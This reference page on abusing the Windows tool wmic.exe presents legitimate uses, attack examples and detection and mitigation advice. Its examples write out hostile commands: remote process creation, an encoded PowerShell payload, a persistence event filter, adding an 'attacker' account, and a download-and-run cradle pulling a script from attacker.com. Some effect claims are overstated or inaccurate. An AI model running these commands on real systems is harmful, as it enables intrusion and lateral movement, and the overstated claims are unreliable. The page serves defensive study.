# wmic.exe
## What is it?
*```wmic.exe``` (Windows Management Instrumentation Command-line) is a built-in Windows command-line tool that allows administrators and users to interact with Windows Management Instrumentation (WMI) for managing and querying system information and configuration.*
*WMIC can be used to retrieve detailed system data, configure system settings, and manage hardware, software, and network components, making it a powerful tool for system administration.*

## Legitimate Usage
- **System Configuration Management** → Query and configure various system settings like user accounts, system hardware, and installed software.
- **Automation of System Tasks** → Use WMIC in scripts to automate administrative tasks such as service management and disk cleanup.
- **Hardware Information Retrieval** → Query detailed information about hardware components like CPUs, memory, and hard drives.
- **Software Installation and Management** → Use WMIC to install or uninstall software packages from the command line.
- **User and Group Management** → Create, modify, or delete user accounts and groups via WMIC.

## How to abuse it
- **Remote Command Execution** → Attackers can use ```wmic.exe``` to execute commands remotely on other systems, often bypassing network defenses and firewalls.
- **Persistence via WMI Event Subscription** → Attackers can use WMI to set up persistent remote access, where commands or malicious payloads are triggered by system events.
- **Privilege Escalation** → WMIC can be used to invoke elevated commands, run processes with SYSTEM privileges, or alter security settings.
- **Bypass Security Tools** → Since ```wmic.exe``` is a legitimate Windows utility, attackers can use it to bypass detection by security software, as it may not be flagged.
- **Lateral Movement** → Attackers can use WMIC to propagate malicious code across a network by executing commands on other machines.

## Example attacks
### 1. Remote Code Execution (RCE) via WMIC
*Attackers can use ```wmic.exe``` to execute commands on remote machines without needing direct access to them.*

**Run a Command on a Remote Machine**

```
wmic /node:192.168.1.100 process call create "cmd.exe /c calc.exe"

wmic os get /FORMAT:"file.xsl"

wmic process call create "powershell -enc <base64_payload>"

wmic /node:"targetPC" process call create "cmd.exe /c calc.exe"
```

*Calculator is spawned by svchost.exe:*

![image](https://github.com/user-attachments/assets/9be8f30e-5e05-42e4-a813-a53fb1fc436a)

**Effect:**
- Executes the Calculator application (`calc.exe`) remotely on the target machine, showing that the attacker can run arbitrary commands remotely.

### 2. Persistence via WMI Event Subscription
*Attackers can create a WMI event subscription that triggers a malicious payload whenever a specific system event occurs.*

**Create WMI Event Subscription for Persistence**

```
wmic /namespace:\root\subscription path __EventFilter create Name="MyEventFilter", EventNamespace="root\cimv2", Query="SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process'"
```

**Effect:**
- The attacker sets up an event that listens for a process creation and can trigger a malicious payload whenever this event occurs, providing persistence.

### 3. Privilege Escalation via WMIC
*Attackers can invoke commands with elevated privileges using ```wmic.exe``` to escalate their privileges on a compromised system.*

**Run a Command as SYSTEM**

```
wmic process call create "cmd.exe /c net user attacker Password /add"
```

**Effect:**
- Creates a new user (`attacker`) with elevated privileges by running the command as SYSTEM, enabling the attacker to maintain access to the system.

### 4. Lateral Movement via WMIC
*An attacker can use WMIC to execute commands on other machines in the network and spread malicious tools or code.*

**Execute a Command on a Remote Machine**

```
wmic /node:192.168.1.50 process call create "cmd.exe /c powershell -exec bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

**Effect:**
- This command executes a PowerShell script on a remote machine to download and run a malicious payload, effectively allowing lateral movement across a network.

### 5. Bypassing Security Detection
*Since WMIC is a legitimate utility, it is often overlooked by traditional security tools, making it useful for evading detection.*

**Running WMIC to Bypass Detection**

```
wmic /node:localhost process call create "cmd.exe /c start http://attacker.com/malware.exe"
```

**Effect:**
- Executes a malicious command that could potentially download and execute malware, leveraging WMIC's legitimate status to bypass security tools.

# Detection & Mitigation
## Detection Methods
**Monitor WMIC Activity**
- **Event ID 4688 (Process Creation)** → Detect the use of ```wmic.exe``` to execute suspicious commands.
- **Event ID 4703 (Privilege Use)** → Track attempts to use elevated privileges via WMIC.
- **Monitor Remote Execution** → Track unusual remote command executions (e.g., ```wmic /node:```).

**Monitor for WMI Event Subscriptions**
- **Event ID 5861 (WMI Event Filter Created)** → Detect the creation of WMI event filters that may indicate persistence attempts.

**Monitor Network Connections**
- **Event ID 5156 (Filtering Platform Connection)** → Detect WMIC traffic that could indicate lateral movement or remote execution attempts.

## Mitigation Strategies
- **Restrict WMIC Access** → Limit who can use WMIC by using group policies or restricting access to specific users or administrators.
- **Use Application Whitelisting (AppLocker)** → Prevent unauthorized applications from running, including malicious uses of WMIC.
- **Audit Process Creation** → Enable auditing for process creation and monitor Event ID 4688 to identify the misuse of WMIC.
- **Block Remote Access to WMIC** → Use firewall rules or network segmentation to block remote WMIC access.
- **Use Endpoint Detection and Response (EDR)** → Deploy EDR solutions to monitor for suspicious activity associated with WMIC commands.
